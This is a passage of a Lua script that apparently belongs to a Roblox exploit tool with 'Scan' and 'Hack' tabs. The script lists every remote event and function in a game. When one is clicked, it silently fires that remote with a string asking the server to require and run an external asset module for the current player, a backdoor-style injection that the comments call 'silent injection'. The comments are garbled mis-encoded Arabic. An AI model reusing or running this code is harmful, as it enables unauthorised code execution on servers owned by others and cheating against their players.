-- === Ù…Ù†Ø·Ù‚ Ø§Ù„ØªØ¨Ø¯ÙŠÙ„ ÙˆØ§Ù„Ø¨Ø­Ø« ===
ScanTabBtn.MouseButton1Click:Connect(function() ScanPage.Visible = true; HackPage.Visible = false end)
HackTabBtn.MouseButton1Click:Connect(function() ScanPage.Visible = false; HackPage.Visible = true end)

local selectedRemote = nil
local Layout = Instance.new("UIListLayout", ScanPage)

local function findRemotes()
    for _, v in pairs(ScanPage:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
    for _, v in pairs(game:GetDescendants()) do
        if v:IsA("RemoteEvent") or v:IsA("RemoteFunction") then
            local b = Instance.new("TextButton", ScanPage)
            b.Size = UDim2.new(1, 0, 0, 35)
            b.Text = "Remote: " .. v.Name
            b.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
            b.TextColor3 = Color3.yellow
            b.MouseButton1Click:Connect(function()
                selectedRemote = v
                Title.Text = "  Target: " .. v.Name
                -- Ø­Ù‚Ù† ØµØ§Ù…Øª
                pcall(function() v:FireServer("require(110047253067635):Hload('"..LocalPlayer.Name.."')") end)
                ScanPage.Visible = false; HackPage.Visible = true
            end)
        end
    end
end

-- Ø²Ø± Ø§Ù„ÙØ­Øµ Ø§Ù„ÙƒØ¨ÙŠØ± Ø¨Ø§Ù„Ø£Ø³ÙÙ„
